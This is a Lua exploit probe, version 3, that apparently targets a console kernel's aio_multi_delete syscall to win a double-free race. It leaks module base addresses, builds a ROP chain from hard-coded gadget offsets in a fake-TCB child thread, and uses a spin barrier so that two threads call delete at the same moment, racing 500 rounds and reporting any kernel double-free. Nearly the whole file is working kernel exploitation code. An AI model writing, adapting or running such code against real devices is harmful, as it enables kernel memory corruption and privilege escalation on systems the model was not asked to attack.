-- CRASH_CLASS: HIGH
-- PROBE 555c: aio_multi_delete double-free race (zecoxao model) v3
--
-- v3: spin-barrier synchronization.
-- Child ROP: sysarch → write READY marker → delete
-- Main Lua: spin-wait for READY → delete
-- Both hit delete within microseconds of each other.
--
-- v1 (5 getpid): main always won. v2 (yield+nanosleep): child always won.
-- This version adapts to actual child startup latency.

print("=== PROBE 555c: DOUBLE-DELETE RACE v3 ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function zero(b, n) for off = 0, n - 4, 4 do wd(b + off, 0) end end
local function q(v)
    if type(v) == "table" and v.h then
        local h, l = v.h, v.l
        if h < 0 then h = h + 0x100000000 end
        if l < 0 then l = l + 0x100000000 end
        return string.format("0x%08X%08X", h, l)
    end
    return string.format("0x%X", N(v))
end

local Z = uint64(0)
local sc20  = mk(20)
local sc6   = mk(6)
local sc135 = mk(135)
local sc331 = mk(331)
local sc455 = mk(455)
local sc477 = mk(477)
local sc488 = mk(488)
local sc669 = mk(669)
local sc662 = mk(662)
local sc664 = mk(664)
local sc666 = mk(666)

local pid = N(sc20())
print("pid=" .. pid)

-- Module bases + gadgets
local info = memory.alloc(0x200)
zero(info, 0x200); wd(info, 0x160)
pcall(function() mk(593)(Z, info) end)
local eb = uint64(string.format("0x%X%08X", rd(info + 0x10C) or 0, rd(info + 0x108) or 0))

zero(info, 0x200); wd(info, 0x160)
pcall(function() mk(593)(uint64(0x2001), info) end)
local lk = uint64(string.format("0x%X%08X", rd(info + 0x10C) or 0, rd(info + 0x108) or 0))
print("eb=" .. q(eb) .. " lk=" .. q(lk))

local pop_rax   = eb + uint64(0x992)
local pop_rdi   = eb + uint64(0xC9DFE)
local pop_rsi   = eb + uint64(0xD77D)
local pop_rdx   = eb + uint64(0x3B02D7)
local mov_m_rax = eb + uint64(0x92C67)
local bare_ret  = eb + uint64(0x42)
local fn_addr   = lk + uint64(0xB57)

local BATCH  = 32
local ROUNDS = 500

-- Shared memory layout:
-- +0x000: ready_flag   (child writes 0xBEEF after sysarch, before delete)
-- +0x004: done_flag    (child writes 0xDEAD after delete)
-- +0x010: IDs          (BATCH*4 = 128 bytes)
-- +0x200: child errs   (BATCH*4)
-- +0x400: main errs    (BATCH*4)
local ok_sh, shared = pcall(function()
    return sc477(Z, uint64(0x4000), uint64(3), uint64(0x1002), uint64(0xFFFFFFFF), Z)
end)
print("shared=" .. q(shared))

local ready_addr  = N(shared) + 0x000
local done_addr   = N(shared) + 0x004
local ids_addr    = N(shared) + 0x010
local child_errs  = N(shared) + 0x200
local main_errs   = N(shared) + 0x400

-- Fake TCB
local ok_tcb, tcb_page = pcall(function()
    return sc477(Z, uint64(0x4000), uint64(3), uint64(0x1002), uint64(0xFFFFFFFF), Z)
end)
for i = 0, 0x100, 8 do wq(tcb_page + i, tcb_page) end
local tcb_ptr_buf = memory.alloc(8)
wq(tcb_ptr_buf, tcb_page)

-- Child ROP chain
local ok_stk, stack_base = pcall(function()
    return sc477(Z, uint64(0x200000), uint64(3), uint64(0x1002), uint64(0xFFFFFFFF), Z)
end)
local stack_top = N(stack_base) + 0x100000
local rsp = stack_top - 8

local function build_chain()
    local pos = 0
    local function emit(v) wq(uint64(rsp + pos), v); pos = pos + 8 end

    -- 1. sysarch(165): SET_FSBASE=129
    emit(pop_rdi); emit(uint64(129))
    emit(pop_rsi); emit(uint64(N(tcb_ptr_buf)))
    emit(pop_rax); emit(uint64(165))
    emit(fn_addr)

    -- 2. Write READY marker (child is about to enter delete)
    emit(pop_rax); emit(uint64(0xBEEF))
    emit(pop_rdi); emit(uint64(ready_addr))
    emit(mov_m_rax)

    -- 3. aio_multi_delete(662) — THE RACE TARGET
    emit(pop_rdi); emit(uint64(ids_addr))
    emit(pop_rsi); emit(uint64(BATCH))
    emit(pop_rdx); emit(uint64(child_errs))
    emit(pop_rax); emit(uint64(662))
    emit(fn_addr)

    -- 4. Write done marker
    emit(pop_rax); emit(uint64(0xDEAD))
    emit(pop_rdi); emit(uint64(done_addr))
    emit(mov_m_rax)

    -- 5. thr_exit(431)
    emit(pop_rdi); emit(Z)
    emit(pop_rax); emit(uint64(431))
    emit(fn_addr)

    return pos
end

local chain_sz = build_chain()
print("chain=" .. chain_sz .. "B")

-- thr_param
local tp = memory.alloc(0x40); zero(tp, 0x40)
wq(tp, bare_ret)
wq(tp + 0x10, stack_base)
wq(tp + 0x18, uint64(0x100008))

-- Pin main to core 0
local mask_buf = memory.alloc(8)
wq(mask_buf, uint64(1))
pcall(function()
    sc488(uint64(3), uint64(1),
        uint64(string.format("0x%X%08X", 0xFFFFFFFF, 0xFFFFFFFF)),
        uint64(8), uint64(N(mask_buf)))
end)

-- Pre-allocate reusable buffers
local sv      = memory.alloc(16)
local scratch = memory.alloc(0x1000)
local reqs    = memory.alloc(BATCH * 0x28 + 16)
local ids_tmp = memory.alloc(BATCH * 4 + 16)
local cst     = memory.alloc(BATCH * 4 + 16)
local poll_st = memory.alloc(BATCH * 4 + 16)

-- ============================================================
-- Race loop
-- ============================================================
print(string.format("\nRacing %d rounds, batch=%d (spin-barrier)", ROUNDS, BATCH))

local total_wins = 0
local main_wins = 0
local child_wins = 0
local timeouts = 0

for round = 1, ROUNDS do
    -- 1. Create BATCH socketpairs
    local fds_r = {}
    local fds_w = {}
    local ok_sp = true
    for i = 1, BATCH do
        local ok, v = pcall(function()
            return sc135(uint64(1), uint64(1), Z, uint64(N(sv)))
        end)
        if ok and N(v) >= 0 then
            fds_r[i] = rd(sv)
            fds_w[i] = rd(sv + 4)
        else
            ok_sp = false; break
        end
    end

    if not ok_sp then
        if round <= 3 then print("R" .. round .. ": socketpair fail") end
    else
        -- 2. Submit AIO batch
        for i = 0, BATCH - 1 do
            local base = reqs + i * 0x28
            wq(base + 0x00, Z)
            wq(base + 0x08, uint64(0x1000))
            wq(base + 0x10, uint64(N(scratch)))
            wq(base + 0x18, Z)
            wd(base + 0x20, fds_r[i + 1])
            wd(base + 0x24, 0)
        end
        for i = 0, BATCH - 1 do wd(ids_tmp + i * 4, 0) end

        pcall(function()
            sc669(uint64(0x1001), uint64(N(reqs)), uint64(BATCH),
                uint64(3), uint64(N(ids_tmp)))
        end)

        -- 3. Cancel + close peers → terminal
        pcall(function()
            sc666(uint64(N(ids_tmp)), uint64(BATCH), uint64(N(cst)))
        end)
        for i = 1, BATCH do
            pcall(function() sc6(uint64(fds_w[i])) end)
        end

        -- 4. Poll until all terminal
        local all_term = false
        for try = 1, 100 do
            pcall(function()
                sc664(uint64(N(ids_tmp)), uint64(BATCH), uint64(N(poll_st)))
            end)
            all_term = true
            for i = 0, BATCH - 1 do
                local s = rd(poll_st + i * 4)
                if not s or s < 3 then all_term = false; break end
            end
            if all_term then break end
        end

        if all_term then
            -- 5. Copy IDs to shared memory
            for i = 0, BATCH - 1 do
                wd(ids_addr + i * 4, rd(ids_tmp + i * 4) or 0)
            end

            -- 6. Clear flags + error arrays
            wd(ready_addr, 0)
            wd(done_addr, 0)
            for i = 0, BATCH - 1 do
                wd(child_errs + i * 4, 0x77777777)
                wd(main_errs + i * 4, 0x77777777)
            end

            -- 7. Launch child thread
            pcall(function()
                sc455(uint64(N(tp)), uint64(0x38))
            end)

            -- 8. SPIN-WAIT for child READY (child finished sysarch, about to delete)
            local spin = 0
            local ready = false
            for s = 1, 50000 do
                if (rd(ready_addr) or 0) == 0xBEEF then
                    ready = true; spin = s; break
                end
            end

            -- 9. Main calls delete IMMEDIATELY (child is entering delete now)
            if ready then
                pcall(function()
                    sc662(uint64(ids_addr), uint64(BATCH), uint64(main_errs))
                end)
            end

            -- 10. Wait for child done
            local child_done = false
            for w = 1, 1000 do
                if (rd(done_addr) or 0) == 0xDEAD then
                    child_done = true; break
                end
            end

            if not child_done then
                timeouts = timeouts + 1
            end

            -- 11. Compare error arrays
            if ready then
                local win_slots = {}
                local round_main_ok = 0
                local round_child_ok = 0

                for i = 0, BATCH - 1 do
                    local ce = rd(child_errs + i * 4) or 0x77777777
                    local me = rd(main_errs + i * 4) or 0x77777777

                    if ce == 0 and me == 0 then
                        win_slots[#win_slots + 1] = i
                    end
                    if me == 0 then round_main_ok = round_main_ok + 1 end
                    if ce == 0 then round_child_ok = round_child_ok + 1 end
                end

                if round_main_ok == BATCH then main_wins = main_wins + 1 end
                if round_child_ok == BATCH then child_wins = child_wins + 1 end

                if #win_slots > 0 then
                    total_wins = total_wins + #win_slots
                    print(string.format("R%d: *** DOUBLE-FREE %d slots spin=%d ***",
                        round, #win_slots, spin))
                end
            end

            -- Progress
            if round % 50 == 0 then
                print(string.format("  r=%d w=%d m=%d c=%d to=%d pid=%d",
                    round, total_wins, main_wins, child_wins, timeouts, N(sc20())))
            end
        end

        -- Cleanup fds
        for i = 1, BATCH do
            pcall(function() sc6(uint64(fds_r[i])) end)
        end
    end
end

-- Summary
print("")
local pid2 = N(sc20())
print(string.format("TOTAL: rounds=%d wins=%d main=%d child=%d timeouts=%d pid=%d%s",
    ROUNDS, total_wins, main_wins, child_wins, timeouts, pid2,
    pid2 == pid and " OK" or " CHANGED"))

if total_wins > 0 then
    print(">>> DOUBLE-FREE CONFIRMED ON 14.10 <<<")
else
    print("no double-free in " .. ROUNDS .. " rounds")
    if child_wins > main_wins * 3 then
        print("child dominates — main still too slow after spin-wait")
    elseif main_wins > child_wins * 3 then
        print("main dominates — spin resolves too fast")
    else
        print("mixed — window may be too narrow for this batch size")
    end
end
print("=== 555c DONE ===")
